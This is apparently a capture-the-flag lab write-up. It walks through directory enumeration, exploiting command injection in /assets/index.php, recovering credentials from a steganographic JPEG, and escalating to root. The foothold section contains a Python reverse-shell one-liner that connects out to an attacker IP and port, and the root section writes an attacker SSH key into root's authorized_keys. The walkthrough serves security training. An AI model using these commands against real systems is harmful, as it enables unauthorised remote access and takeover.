## Recon

Directory enumeration with ffuf leads us to /assets/

Further probbing led to /assets/index.php 
(use seclists/Discovery/Web-Content/common.txt)

which is vulnerable to command injection


## Initail foothold

Setup a listener then, use
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<IP>",<PORT>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```
from [revshells](https://www.revshells.com/) to obtain a shell (replace <IP>:<PORT>)

## OBtaining deku's creds

Obtain the passphrase in Hidden_Content/ directory and download the oneforall.jpg image

The image appears to be corrupt, so we try fixing it by using
```
ghex oneforall.jpg
```
Then, replace the first lines with the jpg hex string
```
FF D8 FF E0 00 10 4A 46 49 46
```
The oneforall.jpg image was apparently a stego file, so with the passphrase obtained earlier, extract the information with
```
steghide extract -sf oneforall.jpg
```

## Getting the user flag
ssh unto the system as deku, flag at
```
/home/deku/user.txt
```


## Gaining root
After running sudo -l, we find a
```
/opt/NewContent/feedback.sh
```
That accepts redirects from us, and has root access as well

Knowing this, we generate a pair of ssh keys on our local machine for use.

Run the feedback script and feed in our ssh keys along with a redirect that sends it to the root users ssh authorized_keys
```
(pub ssh key) > /root/.ssh/authorized_keys
```
ssh as root from our local machine to gain root level access


